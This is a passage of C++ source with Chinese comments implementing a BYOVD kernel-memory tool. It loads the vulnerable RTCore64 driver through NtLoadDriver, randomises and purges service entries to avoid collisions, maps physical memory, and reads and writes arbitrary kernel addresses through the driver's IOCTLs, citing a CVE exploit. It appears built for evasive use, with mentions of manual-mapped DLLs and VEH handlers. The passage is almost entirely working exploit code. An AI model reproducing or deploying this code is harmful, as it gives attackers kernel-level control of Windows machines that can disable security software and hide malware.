                    ByovdDiag("BYOVD:EnsureDriverFile: constructing wstring from '%ls'...\n", tryPath);
                    std::wstring result(tryPath);
                    ByovdDiag("BYOVD:EnsureDriverFile: wstring constructed OK (len=%zu)\n", result.length());
                    return result;
                }
                ByovdDiag("BYOVD:EnsureDriverFile: CreateFileW FAILED for %ls (err=%u, retry=%d)\n", tryPath, GetLastError(), retry);
            }
        } else {
            ByovdDiag("BYOVD:EnsureDriverFile: embedData=0x%p or embedSize=%zu — skipping\n", embedData, embedSize);
        }
    }

    return L"";
}

// ★ v3.75: 强制停止并删除所有残留 RTCore64 服务
//   解决 STATUS_OBJECT_NAME_COLLISION (0xC0000035):
//   之前异常的进程退出导致 \Driver\RTCore64 内核对象未清理,
//   导致再次加载时 NtLoadDriver 返回重名冲突
//   通过 SCM ControlService(SERVICE_CONTROL_STOP) 触发 DriverUnload,
//   然后 NtUnloadDriver + DeleteService 彻底清理
static void ForceRemoveRTCore64Services() {
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr,
        SC_MANAGER_CONNECT | SC_MANAGER_ENUMERATE_SERVICE);
    if (!hSCM) return;

    DWORD bytesNeeded = 0, serviceCount = 0, resumeHandle = 0;
    // 第一次调用获取所需缓冲区大小
    EnumServicesStatusExW(hSCM, SC_ENUM_PROCESS_INFO, SERVICE_DRIVER,
        SERVICE_STATE_ALL, nullptr, 0, &bytesNeeded,
        &serviceCount, &resumeHandle, nullptr);
    if (bytesNeeded == 0) { CloseServiceHandle(hSCM); return; }

    std::vector<BYTE> buf(bytesNeeded + 0x100);
    auto* services = (ENUM_SERVICE_STATUS_PROCESSW*)buf.data();
    if (!EnumServicesStatusExW(hSCM, SC_ENUM_PROCESS_INFO, SERVICE_DRIVER,
        SERVICE_STATE_ALL, buf.data(), (DWORD)buf.size(), &bytesNeeded,
        &serviceCount, &resumeHandle, nullptr)) {
        CloseServiceHandle(hSCM);
        return;
    }

    for (DWORD i = 0; i < serviceCount; i++) {
        bool isOurSvc = (wcsstr(services[i].lpServiceName, L"RTCore64") == services[i].lpServiceName)
                     || (wcsstr(services[i].lpServiceName, L"SysMon") == services[i].lpServiceName);
        if (!isOurSvc)
            continue;

        ByovdDiag("BYOVD:ForceRemove: found stale service '%ls' (state=%u)\n",
            services[i].lpServiceName, services[i].ServiceStatusProcess.dwCurrentState);

        SC_HANDLE hSvc = OpenServiceW(hSCM, services[i].lpServiceName,
            SERVICE_STOP | SERVICE_QUERY_STATUS | DELETE);
        if (!hSvc) continue;

        // 发送 STOP 控制码 → 触发驱动的 DriverUnload 例程
        SERVICE_STATUS svcStatus;
        if (ControlService(hSvc, SERVICE_CONTROL_STOP, &svcStatus)) {
            // 等待驱动完全卸载 (最多等 3 秒)
            for (int wait = 0; wait < 30; wait++) {
                if (!QueryServiceStatus(hSvc, &svcStatus)) break;
                if (svcStatus.dwCurrentState == SERVICE_STOPPED) break;
                Sleep(100);
            }
        }

        // 删除服务
        DeleteService(hSvc);
        CloseServiceHandle(hSvc);

        // ★ 兜底: 用 NtUnloadDriver 再试一次 (确保内核对象释放)
        std::wstring regPath = L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\";
        regPath += services[i].lpServiceName;
        UNICODE_STRING us;
        us.Buffer = regPath.data();
        us.Length = (USHORT)(regPath.size() * sizeof(wchar_t));
        us.MaximumLength = us.Length + sizeof(wchar_t);
        HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
        if (ntdll) {
            using NtUnloadDriver_t = NTSTATUS(NTAPI*)(PUNICODE_STRING);
            auto pNtUnloadDriver = (NtUnloadDriver_t)GetProcAddress(ntdll, "NtUnloadDriver");
            if (pNtUnloadDriver) pNtUnloadDriver(&us);
        }
    }
    CloseServiceHandle(hSCM);
}

bool KernelMemoryAccessor::LoadDriver(const std::wstring& serviceName, 
                                       const std::wstring& driverPath) {
    // ★ v3.92: 必须先启用特权再清理 — ForceRemoveRTCore64Services 内部也调用 NtUnloadDriver
    EnablePrivilege(L"SeLoadDriverPrivilege");

    // ★ v3.75: 加载前强制清理所有残留 RTCore64 服务/驱动
    ForceRemoveRTCore64Services();

    // 注册表: 创建服务条目
    std::wstring keyPath = L"SYSTEM\\CurrentControlSet\\Services\\" + serviceName;
    HKEY hKey;

    // v3.61: 先尝试卸载旧驱动 (需要 registry key 还未删除)
    UnloadDriver(serviceName);

    // v3.55: 删旧服务再重建 — 防止残留键导致 STATUS_OBJECT_NAME_INVALID
    RegDeleteTreeW(HKEY_LOCAL_MACHINE, keyPath.c_str());
    
    // ★ v3.97: DeleteService 只标记删除, 键可能仍存在 (ERROR_ALREADY_EXISTS=183)
    //   先尝试创建, 若已存在则打开现有键
    LONG regResult = RegCreateKeyExW(HKEY_LOCAL_MACHINE, keyPath.c_str(),
                        0, nullptr, REG_OPTION_NON_VOLATILE,
                        KEY_ALL_ACCESS, nullptr, &hKey, nullptr);
    if (regResult != ERROR_SUCCESS) {
        if (regResult == ERROR_ALREADY_EXISTS) {
            // 键已存在 (DeleteService 标记删除但未清理), 尝试打开
            regResult = RegOpenKeyExW(HKEY_LOCAL_MACHINE, keyPath.c_str(),
                                      0, KEY_ALL_ACCESS, &hKey);
        }
        if (regResult != ERROR_SUCCESS) {
            ByovdDiag("BYOVD:LoadDriver: RegCreateKeyEx/RegOpenKeyEx FAILED (err=%u)\n", regResult);
            return false;
        }
        ByovdDiag("BYOVD:LoadDriver: opened existing key (was marked for deletion)\n");
    }

    DWORD type = 1; // SERVICE_KERNEL_DRIVER
    DWORD start = 3; // SERVICE_DEMAND_START
    DWORD errorControl = 1; // SERVICE_ERROR_NORMAL

    RegSetValueExW(hKey, L"Type", 0, REG_DWORD, (BYTE*)&type, sizeof(type));
    RegSetValueExW(hKey, L"Start", 0, REG_DWORD, (BYTE*)&start, sizeof(start));
    RegSetValueExW(hKey, L"ErrorControl", 0, REG_DWORD, (BYTE*)&errorControl, sizeof(errorControl));

    // 使用驱动文件名(同目录)或系统路径
    wchar_t fullPath[MAX_PATH];
    if (driverPath.find(L'\\') == std::wstring::npos) {
        // 仅文件名 → 补充完整路径
        GetSystemDirectoryW(fullPath, MAX_PATH);
        wcscat_s(fullPath, L"\\drivers\\");
        wcscat_s(fullPath, driverPath.c_str());
    } else {
        wcscpy_s(fullPath, driverPath.c_str());
    }

    // v3.48: 内核需要 NT 路径格式 — 自动加 \??\ 前缀
    wchar_t ntPath[MAX_PATH * 2];
    if (fullPath[0] != L'\\' && fullPath[1] != L'\\') {
        swprintf_s(ntPath, L"\\??\\%ls", fullPath);
    } else {
        wcscpy_s(ntPath, fullPath);
    }

    RegSetValueExW(hKey, L"ImagePath", 0, REG_EXPAND_SZ,
                   (BYTE*)ntPath, (DWORD)((wcslen(ntPath) + 1) * sizeof(wchar_t)));
    ByovdDiag("BYOVD:LoadDriver: ImagePath=%ls\n", ntPath);
    RegCloseKey(hKey);

    // 调用 NtLoadDriver (走 syscall 更安全, 但这里用直接调用)
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return false;

    using NtLoadDriver_t = NTSTATUS(NTAPI*)(PUNICODE_STRING);
    auto pNtLoadDriver = (NtLoadDriver_t)GetProcAddress(ntdll, "NtLoadDriver");
    if (!pNtLoadDriver) return false;

    std::wstring regPath = L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\" + serviceName;
    UNICODE_STRING us;
    us.Buffer = regPath.data();
    us.Length = (USHORT)(regPath.size() * sizeof(wchar_t));
    us.MaximumLength = us.Length + sizeof(wchar_t);

    NTSTATUS status = pNtLoadDriver(&us);
    ByovdDiag("BYOVD:LoadDriver: NtLoadDriver → 0x%08X\n", status);
    // STATUS_IMAGE_ALREADY_LOADED (0xC000010E) 也是成功
    return NT_SUCCESS(status) || status == 0xC000010E;
}

bool KernelMemoryAccessor::UnloadDriver(const std::wstring& serviceName) {
    // ★ v3.87: NtUnloadDriver 需要 SeLoadDriverPrivilege, 否则静默失败
    //         之前缺少此特权导致驱动无法卸载 → zombie \Device\RTCore64 残留
    EnablePrivilege(L"SeLoadDriverPrivilege");

    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return false;

    using NtUnloadDriver_t = NTSTATUS(NTAPI*)(PUNICODE_STRING);
    auto pNtUnloadDriver = (NtUnloadDriver_t)GetProcAddress(ntdll, "NtUnloadDriver");
    if (!pNtUnloadDriver) return false;

    std::wstring regPath = L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\" + serviceName;
    UNICODE_STRING us;
    us.Buffer = regPath.data();
    us.Length = (USHORT)(regPath.size() * sizeof(wchar_t));
    us.MaximumLength = us.Length + sizeof(wchar_t);

    NTSTATUS st = pNtUnloadDriver(&us);
    ByovdDiag("BYOVD:UnloadDriver: %ls → 0x%08X\n", serviceName.c_str(), (uint32_t)st);
    return NT_SUCCESS(st);
}

bool KernelMemoryAccessor::EnablePrivilege(const wchar_t* privilegeName) {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        return false;
    }

    TOKEN_PRIVILEGES tp = {};
    tp.PrivilegeCount = 1;
    LookupPrivilegeValueW(nullptr, privilegeName, &tp.Privileges[0].Luid);
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), nullptr, nullptr);
    CloseHandle(hToken);
    return GetLastError() == ERROR_SUCCESS;
}

// ============================================================
// 物理内存映射管理
// ============================================================

// 物理内存映射条目
struct PhysMemMapping {
    uint64_t physAddr;       // 映射的物理地址起始
    uint32_t size;           // 映射大小
    uint8_t* virtAddr;       // 映射到的用户态虚拟地址
};

static std::vector<PhysMemMapping> g_physMappings;

// 最大缓存的物理内存映射数量 (LRU淘汰)
static constexpr size_t MAX_PHYS_MAPPINGS = 64;

bool KernelMemoryAccessor::MapPhysical(uint64_t physAddr, uint32_t size,
                                        uint8_t** outVirtAddr) {
    if (m_hDevice == INVALID_HANDLE_VALUE) return false;

    // 页对齐
    uint64_t alignedAddr = physAddr & ~0xFFFULL;
    uint32_t alignedSize = ((physAddr + size - alignedAddr + 0xFFF) & ~0xFFF);

    // 检查是否已映射
    for (auto& m : g_physMappings) {
        if (m.physAddr == alignedAddr && m.size >= alignedSize) {
            *outVirtAddr = m.virtAddr + (physAddr - alignedAddr);
            return true;
        }
    }

    // ★ v3.100: 使用探测到的 IOCTL 码和格式进行物理内存映射
    //   替代旧的硬编码 {uint64_t, uint32_t, uint32_t} 格式

    // ★ v3.83: 保存关键全局变量到栈, 防止 IOCTL 映射覆盖 .data 段导致指针损坏
    uint8_t* savedBackupBuf    = ::g_backupBuf;
    SIZE_T   savedBackupLen    = ::g_backupLen;
    uint8_t* savedBackupCodeBase = ::g_backupCodeBase;

    // ★ v3.105: 使用探测到的 IOCTL 码
    uint32_t mapIoctl = g_probedReadIoctl ? g_probedReadIoctl : m_driverInfo.ioctlCode;
    ByovdDiag("BYOVD:Map: IOCTL REQ phys=0x%llX size=%u fmt=%d ioctl=0x%08X\n",
        (unsigned long long)alignedAddr, alignedSize, (int)g_probedIoctlFormat, mapIoctl);

    uint8_t* mappedAddr = nullptr;
    DWORD devErr = 0;
    bool ok = TryMapPhysical(m_hDevice, mapIoctl, alignedAddr,
                             g_probedIoctlFormat, &mappedAddr, &devErr);

    ByovdDiag("BYOVD:Map: IOCTL RSP ok=%d mappedVA=0x%llX err=%u\n",
        (int)ok, (unsigned long long)(uintptr_t)mappedAddr, devErr);

    // ★ v3.83: IOCTL 后立即 restore 全局变量 (若 .data 段被污染)
    if (::g_backupBuf != savedBackupBuf || ::g_backupCodeBase != savedBackupCodeBase || ::g_backupLen != savedBackupLen) {
        ByovdDiag("BYOVD:Map: DETECT .data corruption! restoring globals\n");
        ::g_backupBuf = savedBackupBuf;
        ::g_backupCodeBase = savedBackupCodeBase;
        ::g_backupLen = savedBackupLen;
    }

    if (!ok || !mappedAddr) {
        ByovdDiag("BYOVD:Map: FAILED — err=%u\n", devErr);
        return false;
    }

    // 缓存映射
    PhysMemMapping mapping;
    mapping.physAddr = alignedAddr;
    mapping.size     = alignedSize;
    mapping.virtAddr = mappedAddr;
    g_physMappings.push_back(mapping);

    // ★ v3.78: 检测 IOCTL 映射是否覆盖了受保护区 (DLL代码/备份缓冲区)
    //   RTCore64 驱动已通过 MmMapIoSpace/MDL 修改了 PTE — 破坏已发生!
    //   检测到重叠后, 先从备份恢复被破坏的页面, 再返回 false
    bool doesOverlap = IsOverlappingProtectedRegion((uintptr_t)mappedAddr, alignedSize);
    ByovdDiag("BYOVD:Map: overlapCheck=%d (regions=%llu)\n",
        (int)doesOverlap, (unsigned long long)g_protectedUserRegions.size());

    if (doesOverlap) {
        ByovdDiag("BYOVD:MapPhysical: OVERLAP! mappedVA=0x%llX size=%u phys=0x%llX\n",
            (unsigned long long)mappedAddr, alignedSize, (unsigned long long)alignedAddr);

        // ★ v3.78: 主动恢复 — 逐页检查并修复被破坏的受保护区
        if (savedBackupBuf && savedBackupCodeBase && savedBackupLen > 0) {
            uintptr_t overlapStart = (uintptr_t)mappedAddr;
            uintptr_t overlapEnd   = overlapStart + alignedSize;
            uintptr_t codeStart    = (uintptr_t)savedBackupCodeBase;
            uintptr_t codeEnd      = codeStart + savedBackupLen;

            ByovdDiag("BYOVD:Map: overlap range [0x%llX, 0x%llX) vs code [0x%llX, 0x%llX)\n",
                (unsigned long long)overlapStart, (unsigned long long)overlapEnd,
                (unsigned long long)codeStart, (unsigned long long)codeEnd);

            // 找到映射与代码区的交集
            uintptr_t restoreStart = (overlapStart > codeStart) ? overlapStart : codeStart;
            uintptr_t restoreEnd   = (overlapEnd   < codeEnd)   ? overlapEnd   : codeEnd;

            if (restoreStart < restoreEnd) {
                SIZE_T restoreOff = restoreStart - codeStart;
                SIZE_T restoreSz  = restoreEnd - restoreStart;
                BYTE* restoreDst  = (BYTE*)restoreStart;
                BYTE* restoreSrc  = savedBackupBuf + restoreOff;

                ByovdDiag("BYOVD:Map: restoring %llu bytes at off=%llu\n",
                    (unsigned long long)restoreSz, (unsigned long long)restoreOff);

                // 逐页恢复, 保存/恢复原始保护
                SIZE_T restoredBytes = 0;
                while (restoredBytes < restoreSz) {
                    SIZE_T chunk = ((restoreSz - restoredBytes) < 0x1000)
                        ? (restoreSz - restoredBytes) : 0x1000;
                    void* pageVA = restoreDst + restoredBytes;

                    // 跳过 VEH handler 所在页 (保持不变)
                    if (::g_vehHandlerPageVA && (uintptr_t)pageVA == (uintptr_t)::g_vehHandlerPageVA) {
                        ByovdDiag("BYOVD:Map: skip VEH handler page @0x%llX\n", (unsigned long long)pageVA);
                        restoredBytes += chunk;
                        continue;
                    }

                    DWORD oldProt = 0, dummy = 0;
                    BOOL vpOk = VirtualProtect(pageVA, chunk, PAGE_READWRITE, &oldProt);
                    if (!vpOk) {
                        ByovdDiag("BYOVD:Map: VirtualProtect FAILED @0x%llX err=%u\n",
                            (unsigned long long)pageVA, GetLastError());
                        restoredBytes += chunk;
                        continue;
                    }
                    memcpy(pageVA, restoreSrc + restoredBytes, chunk);
                    // 恢复原始保护 (非强制 EXECUTE_READ)
                    VirtualProtect(pageVA, chunk,
                        (oldProt == PAGE_READWRITE) ? PAGE_READWRITE : PAGE_EXECUTE_READ,
                        &dummy);
                    restoredBytes += chunk;
                }
                ByovdDiag("BYOVD:MapPhysical: proactively restored %llu bytes from overlap\n",
                    (unsigned long long)restoredBytes);
            } else {
                ByovdDiag("BYOVD:Map: no intersection with code region\n");
            }
        } else {
            ByovdDiag("BYOVD:Map: no backup available for restore\n");
        }

        g_physMappings.pop_back();
        return false;
    }

    // LRU 淘汰
    if (g_physMappings.size() > MAX_PHYS_MAPPINGS) {
        // 不释放映射 (内核驱动管理), 只从列表中移除
        g_physMappings.erase(g_physMappings.begin());
    }

    *outVirtAddr = mappedAddr + (physAddr - alignedAddr);
    return true;
}

bool KernelMemoryAccessor::ReadPhysical(uint64_t physAddr, void* outBuf, size_t size) {
    // ★ v3.108: 物理内存读取 — 通过内核VA读取 (先转换VA→PA再读取)
    //   此函数不再通过直接IOCTL读取物理内存, 而是通过内核VA路径
    //   注意: 需要先有有效的VA→PA映射
    if (m_hDevice == INVALID_HANDLE_VALUE) return false;
    // 尝试通过内核VA读取: 构造一个指向物理地址的内核VA
    // 实际上, 直接物理内存读取需要 MmMapIoSpace, 此IOCTL不支持
    // 回退到尝试通过 IOCTL 直接读取
    uint32_t ioctl = g_probedReadIoctl ? g_probedReadIoctl : m_driverInfo.ioctlCode;
    // 注意: KernelVAReadViaIOCTL 读取的是内核VA, 不是物理地址
    // 此函数仅用于兼容, 实际物理内存读取可能失败
    return KernelVAReadViaIOCTL(m_hDevice, ioctl, physAddr, outBuf, size);
}

bool KernelMemoryAccessor::WritePhysical(uint64_t physAddr, const void* inBuf, size_t size) {
    if (m_hDevice == INVALID_HANDLE_VALUE) return false;
    uint32_t writeIoctl = g_probedWriteIoctl ? g_probedWriteIoctl : m_driverInfo.ioctlCode;
    return KernelVAWriteViaIOCTL(m_hDevice, writeIoctl, physAddr, inBuf, size);
}

// ============================================================
// 内核虚拟地址读写 (通过 IOCTL 直接读写内核VA)
// IOCTL 0x80002048 读取内核虚拟地址, 无需 VA→PA 转换
// ============================================================

bool KernelMemoryAccessor::ReadKernelVA(uint64_t va, void* outBuf, size_t size) {
    // ★ v3.108: 直接通过 IOCTL 读取内核虚拟地址, 无需 VA→PA 转换
    //   参考: CVE-2022-22077 exploit — 0x80002048 直接读取内核VA
    if (!m_active) return false;
    if (va < 0xFFFF800000000000ULL) return false; // 非法内核地址
    uint32_t ioctl = g_probedReadIoctl ? g_probedReadIoctl : m_driverInfo.ioctlCode;
    return KernelVAReadViaIOCTL(m_hDevice, ioctl, va, outBuf, size);
}

bool KernelMemoryAccessor::WriteKernelVA(uint64_t va, const void* inBuf, size_t size) {
    // ★ v3.108: 直接通过 IOCTL 写入内核虚拟地址
    if (!m_active) return false;
    if (va < 0xFFFF800000000000ULL) return false;
    uint32_t ioctl = g_probedWriteIoctl ? g_probedWriteIoctl : m_driverInfo.ioctlCode;
    return KernelVAWriteViaIOCTL(m_hDevice, ioctl, va, inBuf, size);
}

// ============================================================
// 内核模块基址解析
// ============================================================

uint64_t KernelMemoryAccessor::GetNtoskrnlBase() {
    if (m_ntosBase) return m_ntosBase;
    m_ntosBase = GetKernelModuleBase("ntoskrnl.exe");
    return m_ntosBase;
}

uint64_t KernelMemoryAccessor::GetKernelModuleBase(const std::string& moduleName) {
    // v3.65: 使用 EnumDeviceDrivers — 比手动解析 SystemModuleInformation 更可靠
    // 之前的 NtQuerySystemInformation class=11 方法在 MinGW/manual-map 下不稳定
    LPVOID drivers[1024];
    DWORD cbNeeded = 0;

    if (!EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded)) {
        ByovdDiag("BYOVD:GetKernelModuleBase: EnumDeviceDrivers FAILED (err=%u)\n", GetLastError());
        return 0;
    }

    int driverCount = cbNeeded / sizeof(LPVOID);
    ByovdDiag("BYOVD:GetKernelModuleBase: %d kernel drivers found, searching '%s'...\n",
        driverCount, moduleName.c_str());

    for (int i = 0; i < driverCount; i++) {
        char baseName[256] = {};
        DWORD nameLen = GetDeviceDriverBaseNameA(drivers[i], baseName, sizeof(baseName));
        if (nameLen > 0) {
            if (_stricmp(baseName, moduleName.c_str()) == 0) {
                ByovdDiag("BYOVD:GetKernelModuleBase: found %s at 0x%p\n", baseName, drivers[i]);
                return (uint64_t)drivers[i];
            }
        }
    }

    ByovdDiag("BYOVD:GetKernelModuleBase: '%s' NOT FOUND among %d drivers\n",
        moduleName.c_str(), driverCount);
    return 0;
}

// ============================================================
// 初始化 / 清理
// ============================================================

bool KernelMemoryAccessor::Initialize(const BYOVDDriverInfo& driver) {
    ByovdDiag("BYOVD:Init: ENTER (driverPath='%ls' svcName='%ls')\n",
        driver.driverPath.c_str(), driver.serviceName.c_str());
    m_driverInfo = driver;
    ByovdDiag("BYOVD:Init: m_driverInfo copied OK\n");

    // 1. 检测 HVCI
    if (IsHVCIEnabled()) {
        ByovdDiag("BYOVD:Init: HVCI ENABLED (will likely block driver load)\n");
    }
    ByovdDiag("BYOVD:Init: HVCI check done\n");

    // 2. 确保驱动文件存在 (System32\drivers → 嵌入提取到 %TEMP%)
    ByovdDiag("BYOVD:Init: calling EnsureDriverFile('%ls')...\n", driver.driverPath.c_str());
    std::wstring resolvedPath = EnsureDriverFile(driver.driverPath);
    ByovdDiag("BYOVD:Init: EnsureDriverFile returned, string length=%zu\n", resolvedPath.length());
    ByovdDiag("BYOVD:Init: EnsureDriverFile returned '%ls'\n", resolvedPath.c_str());
    const std::wstring& actualPath = resolvedPath.empty() ? driver.driverPath : resolvedPath;

    // 3. ★ v3.76: 始终随机化服务名 — 防止 \Driver\<ServiceName> 僵尸内核对象冲突
    //   之前的逻辑依赖文件名含 '_' 后缀，但 EnsureDriverFile 首试即写原名，
    //   导致 actualServiceName 永远 = "RTCore64Svc"，NtLoadDriver 必返回 0xC0000035
    wchar_t suffix[16];
    swprintf_s(suffix, L"_%04X", (rand() & 0xFFFF));
    std::wstring actualServiceName = driver.serviceName + suffix;
    m_actualServiceName = actualServiceName;  // store for cleanup

    // v3.95: 扫描注册表, 卸载所有残留的 RTCore64/SysMon 服务
    //        避免 STATUS_OBJECT_NAME_COLLISION (0xC0000035)
    {
        HKEY hServices;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
            L"SYSTEM\\CurrentControlSet\\Services", 0,
            KEY_ENUMERATE_SUB_KEYS | DELETE, &hServices) == ERROR_SUCCESS)
        {
            wchar_t subKeyName[256];
            DWORD idx = 0;
            while (idx < 512) {
                DWORD nameLen = 256;
                LONG enumResult = RegEnumKeyExW(hServices, idx, subKeyName, &nameLen,
                    nullptr, nullptr, nullptr, nullptr);
                if (enumResult != ERROR_SUCCESS) break;
                // 匹配 RTCore64Svc 或 SysMon 前缀 (历史及当前随机化服务名)
                bool isStaleSvc = (wcsstr(subKeyName, L"RTCore64Svc") == subKeyName)
                               || (wcsstr(subKeyName, L"SysMon") == subKeyName);
                if (isStaleSvc) {
                    std::wstring svcName(subKeyName);
                    // 跳过当前要加载的服务名
                    if (svcName == actualServiceName) { idx++; continue; }
                    ByovdDiag("BYOVD:Init: found stale service '%ls', unloading...\n", subKeyName);
                    // ★ 先卸载 (需要 registry key 存在)
                    bool unloaded = UnloadDriver(svcName);
                    ByovdDiag("BYOVD:Init: unload %ls → %d\n", subKeyName, (int)unloaded);
                    // 卸载后删除注册表残留
                    RegDeleteTreeW(hServices, subKeyName);
                    // 不要 idx++ — 删除后索引会变, 重新从 idx 开始
                } else {
                    idx++;
                }
            }
            RegCloseKey(hServices);
        }
    }

    // ★ v3.94: 先尝试直接打开已有设备 (可能是 zombie 但仍可用)
    //   避免 crashy 的 NtOpenDirectoryObject/NtQueryDirectoryObject 枚举
    ByovdDiag("BYOVD:Init: v3.94 probing for existing device %ls...\n",
        m_driverInfo.devicePath.c_str());

    m_hDevice = CreateFileW(m_driverInfo.devicePath.c_str(),
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        nullptr, OPEN_EXISTING, 0, nullptr);

    if (m_hDevice != INVALID_HANDLE_VALUE) {
        // ★ v3.105: 设备已存在, 先探测 IOCTL 码再测试内核读取
        //   之前直接使用默认 IOCTL (0xC3502580 → err=87) 导致误判僵尸设备
        ByovdDiag("BYOVD:Init: existing device opened, probing IOCTL...\n");
        uint8_t* testVA = nullptr;
        uint32_t probedIoctl = ProbeIoctlCode(m_hDevice, &testVA);
        if (probedIoctl != 0) {
            // IOCTL 探测成功 → 设备可用, 更新 IOCTL 码
            m_driverInfo.ioctlCode = probedIoctl;
            m_active = true;
            m_ntosBase = GetNtoskrnlBase();
            if (m_ntosBase) {
                uint16_t magic = 0;
                bool probeOk = ReadKernelVA(m_ntosBase, &magic, 2);
                if (probeOk && magic == 0x5A4D) {
                    ByovdDiag("BYOVD:Init: reusing existing device OK (ntos=0x%llX, ioctl=0x%08X)\n",
                        (unsigned long long)m_ntosBase, probedIoctl);
                    return true;
                }
                ByovdDiag("BYOVD:Init: existing device kernel read FAILED (magic=0x%04X)\n", magic);
            }
        } else {
            ByovdDiag("BYOVD:Init: existing device IOCTL probe FAILED\n");
        }
        // ★ v3.96: 僵尸设备 — IOCTL 不可用, 设备对象残留但无驱动
        //   NtMakeTemporaryObject 对文件句柄无效 (需要设备对象句柄),
        //   NtOpenDirectoryObject 枚举 \Device 目录在 manual-mapped DLL 中会崩溃.
        //   唯一清理方式: 重启系统.
        ByovdDiag("BYOVD:Init: ZOMBIE DEVICE DETECTED — reboot required to clear\n");
        CloseHandle(m_hDevice);
        m_hDevice = INVALID_HANDLE_VALUE;
        m_active = false;
    } else {
        ByovdDiag("BYOVD:Init: no existing device (err=%u), will try to load\n", GetLastError());
    }

    // 4. 加载驱动
    // ★ v3.96: 使用原始未修改驱动 + 原始设备名 \\.\RTCore64.
    //   僵尸设备检测后需重启系统清除, 正常流程通过 Shutdown() 的
    //   SERVICE_CONTROL_STOP 确保 DriverUnload → IoDeleteDevice 清理.
    ByovdDiag("BYOVD:Init: loading %ls (path=%ls)\n", actualServiceName.c_str(), actualPath.c_str());
    bool loadOk = LoadDriver(actualServiceName, actualPath);
    ByovdDiag("BYOVD:Init: LoadDriver → %d\n", (int)loadOk);

    if (!loadOk) {
        // ★ v3.95: NtLoadDriver 失败 — 可能是僵尸设备名冲突
        //   尝试用 DefineDosDeviceW 重建符号链接后打开设备
        //   从 devicePath (如 \\.\RT64_A1B2) 提取 DOS 名和 NT 设备名
        std::wstring devPath = m_driverInfo.devicePath;
        std::wstring dosName, ntDevName;
        if (devPath.size() > 4 && devPath.substr(0, 4) == L"\\\\.\\") {
            dosName = devPath.substr(4);                // e.g. "RT64_A1B2"
            ntDevName = L"\\Device\\" + dosName;        // e.g. "\\Device\\RT64_A1B2"
        } else {
            dosName = L"RTCore64";
            ntDevName = L"\\Device\\RTCore64";
        }

        ByovdDiag("BYOVD:Init: LoadDriver FAILED, trying symlink fix: '%ls' → '%ls'\n",
            dosName.c_str(), ntDevName.c_str());

        if (DefineDosDeviceW(DDD_RAW_TARGET_PATH, dosName.c_str(), ntDevName.c_str())) {
            ByovdDiag("BYOVD:Init: DefineDosDeviceW OK, trying to open...\n");
            m_hDevice = CreateFileW(m_driverInfo.devicePath.c_str(),
                GENERIC_READ | GENERIC_WRITE,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                nullptr, OPEN_EXISTING, 0, nullptr);
            if (m_hDevice != INVALID_HANDLE_VALUE) {
                ByovdDiag("BYOVD:Init: zombie device opened after symlink fix, probing IOCTL...\n");
                uint8_t* testVA2 = nullptr;
                uint32_t probedIoctl2 = ProbeIoctlCode(m_hDevice, &testVA2);
                if (probedIoctl2 != 0) {
                    m_driverInfo.ioctlCode = probedIoctl2;
                    m_active = true;
                    m_ntosBase = GetNtoskrnlBase();
                    if (m_ntosBase) {
                        uint16_t magic = 0;
                        bool probeOk = ReadKernelVA(m_ntosBase, &magic, 2);
                        if (probeOk && magic == 0x5A4D) {
                            ByovdDiag("BYOVD:Init: zombie device IOCTL OK (ntos=0x%llX, ioctl=0x%08X)\n",
                                (unsigned long long)m_ntosBase, probedIoctl2);
                            return true;
                        }
                        ByovdDiag("BYOVD:Init: zombie device IOCTL FAILED (magic=0x%04X)\n", magic);
                    }
                }
                ByovdDiag("BYOVD:Init: ZOMBIE DEVICE DETECTED — reboot required to clear\n");
                CloseHandle(m_hDevice);
                m_hDevice = INVALID_HANDLE_VALUE;
                m_active = false;
            } else {
                ByovdDiag("BYOVD:Init: still cannot open after symlink fix (err=%u)\n", GetLastError());
            }
        } else {
            ByovdDiag("BYOVD:Init: DefineDosDeviceW FAILED (err=%u)\n", GetLastError());
        }

        ByovdDiag("BYOVD:Init: all attempts failed, giving up\n");
        UnloadDriver(m_actualServiceName);
        return false;
    }
    ByovdDiag("BYOVD:Init: LoadDriver OK\n");

    // 5. 打开设备
    m_hDevice = CreateFileW(m_driverInfo.devicePath.c_str(),
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        nullptr, OPEN_EXISTING, 0, nullptr);

    if (m_hDevice == INVALID_HANDLE_VALUE) {
        ByovdDiag("BYOVD:Init: CreateFileW FAILED for %ls (err=%u)\n",
            m_driverInfo.devicePath.c_str(), GetLastError());
        UnloadDriver(m_actualServiceName);
        return false;
    }
    ByovdDiag("BYOVD:Init: device opened OK\n");

    // ★ v3.98: 探测正确的 IOCTL 码和格式
    {
        uint8_t* testVA = nullptr;
        uint32_t probedIoctl = ProbeIoctlCode(m_hDevice, &testVA);
        if (probedIoctl == 0) {
            ByovdDiag("BYOVD:Init: IOCTL probe FAILED — no working IOCTL found\n");
            CloseHandle(m_hDevice);
            m_hDevice = INVALID_HANDLE_VALUE;
            UnloadDriver(m_actualServiceName);
            return false;
        }
        ByovdDiag("BYOVD:Init: IOCTL probe OK — using ioctl=0x%08X (was 0x%08X)\n",
                  probedIoctl, m_driverInfo.ioctlCode);
        m_driverInfo.ioctlCode = probedIoctl; // 更新为实际可用的 IOCTL 码
    }

    m_active = true;
    m_ntosBase = GetNtoskrnlBase();

    // v3.25: 探测 IOCTL 验证驱动 R/W 确实可用
    if (m_ntosBase) {
        uint16_t magic = 0;
        bool probeOk = ReadKernelVA(m_ntosBase, &magic, 2);
        if (!probeOk || magic != 0x5A4D) {
